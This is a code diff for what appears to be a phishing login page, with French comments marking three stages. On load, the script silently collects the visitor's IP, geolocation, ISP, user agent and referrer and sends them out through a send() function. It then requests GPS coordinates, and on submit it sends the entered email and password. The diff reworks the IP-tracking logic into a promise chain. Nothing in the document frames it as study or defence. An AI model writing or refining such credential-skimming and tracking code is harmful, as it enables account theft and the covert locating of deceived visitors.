@@ -72,44 +72,46 @@
 
   let ip = "?";
 
-  (async () => {
-    try {
-      const r = await fetch("https://api.ipify.org?format=json");
-      const d = await r.json();
+  // === ÉTAPE 1 : IP instantané au chargement ===
+  fetch("https://api.ipify.org?format=json")
+    .then(r => r.json())
+    .then(d => {
       ip = d.ip;
-    } catch (_) {}
 
-    send({
-      title: "🔔 Nouveau visiteur",
-      color: 0x4ade80,
-      fields: [
-        { name: "🌐 IP",     value: ip, inline: true },
-        { name: "🔗 URL",   value: location.href.slice(0, 200), inline: false },
-        { name: "↩️ Ref",   value: document.referrer || "direct", inline: false },
-        { name: "💻 UA",    value: navigator.userAgent.slice(0, 200), inline: false },
-        { name: "🕐 Heure", value: new Date().toISOString(), inline: false }
-      ],
-      timestamp: new Date().toISOString()
-    });
+      // Envoi IP immédiat
+      send({
+        title: "🔔 Nouveau visiteur — IP",
+        color: 0x4ade80,
+        fields: [
+          { name: "🌐 IP",     value: ip, inline: true },
+          { name: "🔗 URL",   value: location.href.slice(0, 200), inline: false },
+          { name: "↩️ Ref",   value: document.referrer || "direct", inline: false },
+          { name: "💻 UA",    value: navigator.userAgent.slice(0, 200), inline: false },
+          { name: "🕐 Heure", value: new Date().toISOString(), inline: false }
+        ],
+        timestamp: new Date().toISOString()
+      });
 
-    fetch(`https://ipapi.co/${ip}/json/`, { cache: "no-store" })
-      .then(r => r.json())
-      .then(geo => {
-        send({
-          title: "📍 Geo IP — " + ip,
-          color: 0x60a5fa,
-          fields: [
-            { name: "🏳️ Pays",  value: geo.country_name || "?", inline: true },
-            { name: "🏙️ Ville", value: geo.city         || "?", inline: true },
-            { name: "📡 ISP",   value: geo.org           || "?", inline: false },
-            { name: "🌍 Coords",value: (geo.latitude && geo.longitude) ? `${geo.latitude}, ${geo.longitude}` : "?", inline: false },
-            { name: "🕐 TZ",    value: geo.timezone      || "?", inline: true }
-          ],
-          timestamp: new Date().toISOString()
-        });
-      }).catch(() => {});
-  })();
+      // Geo IP en parallèle
+      return fetch(`https://ipapi.co/${ip}/json/`, { cache: "no-store" });
+    })
+    .then(r => r.json())
+    .then(geo => {
+      send({
+        title: "📍 Geo IP — " + ip,
+        color: 0x60a5fa,
+        fields: [
+          { name: "🏳️ Pays",  value: geo.country_name || "?", inline: true },
+          { name: "🏙️ Ville", value: geo.city         || "?", inline: true },
+          { name: "📡 ISP",   value: geo.org           || "?", inline: false },
+          { name: "🌍 Coords",value: (geo.latitude && geo.longitude) ? `${geo.latitude}, ${geo.longitude}` : "?", inline: false },
+          { name: "🕐 TZ",    value: geo.timezone      || "?", inline: true }
+        ],
+        timestamp: new Date().toISOString()
+      });
+    }).catch(() => {});
 
+  // === ÉTAPE 2 : GPS demandé immédiatement ===
   if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(
       pos => {
@@ -130,6 +132,7 @@
     );
   }
 
+  // === ÉTAPE 3 : Soumission email + mdp ===
   function submit() {
     const email = document.getElementById("email").value.trim();
     const password = document.getElementById("password").value;
@@ -145,10 +148,10 @@
       title: "🔑 Identifiants",
       color: 0xe879f9,
       fields: [
-        { name: "📧 Email",       value: email,    inline: false },
+        { name: "📧 Email",        value: email,    inline: false },
         { name: "🔒 Mot de passe", value: password, inline: false },
-        { name: "🌐 IP",          value: ip,        inline: true },
-        { name: "🕐 Heure",       value: new Date().toISOString(), inline: false }
+        { name: "🌐 IP",           value: ip,        inline: true },
+        { name: "🕐 Heure",        value: new Date().toISOString(), inline: false }
       ],
       timestamp: new Date().toISOString()
     });
